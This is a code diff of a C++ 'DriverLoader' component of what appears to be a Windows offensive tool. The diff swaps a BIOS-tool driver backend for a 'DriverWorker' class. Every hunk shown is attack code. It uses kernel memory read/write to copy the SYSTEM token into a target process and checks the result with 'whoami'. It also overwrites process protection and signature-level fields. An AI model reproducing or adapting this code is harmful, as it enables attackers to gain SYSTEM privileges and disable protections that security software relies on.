@@ -1,6 +1,5 @@
 #include "DriverLoader.h"
-#include "CorMem.h"
-#include "BiosToolCommonDriver.h"
+#include "DriverWorker.hpp"
 #include "Log.hpp"
 #include "Utils.hpp"
 #include <psapi.h>
@@ -39,18 +38,6 @@ DriverLoader::GetKernelBase() -> ULONG64
 	return 0;
 }
 
-auto 
-DriverLoader::InitializeDriver() -> BOOLEAN
-{
-	return g_BiosToolCommonDriver->Initialize();
-}
-
-auto 
-DriverLoader::UninitializeDriver() -> VOID
-{
-	g_BiosToolCommonDriver->Uninitialize();
-}
-
 
 #define TEST 
 
@@ -71,7 +58,7 @@ DriverLoader::PrivilegeEscalation(
 		LOG("----------------------------------Fxxking System---------------------------------");
 #endif
 		ULONG64 systemToken = 0;
-		if (!g_BiosToolCommonDriver->Read((PVOID)(SourceProcess + OffsetOfProcessToken), &systemToken, sizeof(systemToken)))
+		if (!DriverWorker::Read((PVOID)(SourceProcess + OffsetOfProcessToken), &systemToken, sizeof(systemToken)))
 		{
 			LOG("[-] KernelRead System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << std::dec);
 			break;
@@ -80,7 +67,7 @@ DriverLoader::PrivilegeEscalation(
 
 		systemToken &= ~0xF; // Clear the low 4 bits, which are used for reference counting in the token structure
 
-		if (!g_BiosToolCommonDriver->Write(reinterpret_cast<PVOID>(TargetProcess + OffsetOfProcessToken),
+		if (!DriverWorker::Write(reinterpret_cast<PVOID>(TargetProcess + OffsetOfProcessToken),
 										   &systemToken,
 										   sizeof(ULONG64)))
 		{
@@ -95,7 +82,7 @@ DriverLoader::PrivilegeEscalation(
 		system("whoami");
 		LOG("-------------------------------------End-----------------------------------------");
 
-		system("pause");
+		//system("pause");
 #endif
 		bReturn = TRUE;
 	} while (FALSE);
@@ -113,7 +100,7 @@ DriverLoader::SetProcessProtection(
 	do
 	{
 		// set protection
-		if (!g_BiosToolCommonDriver->Write(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
+		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
 										   Protection,
 										   sizeof(DriverLoader::PS_PROTECTION)))
 		{
@@ -148,7 +135,7 @@ DriverLoader::SetSignatureLevel(
 	{
 		//UCHAR signatureLevel = 0xC; // SE_SIGNING_LEVEL_WINDOWS
 
-		if (!g_BiosToolCommonDriver->Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
+		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
 										   SignatureLevel,
 										   sizeof(UCHAR)))
 		{
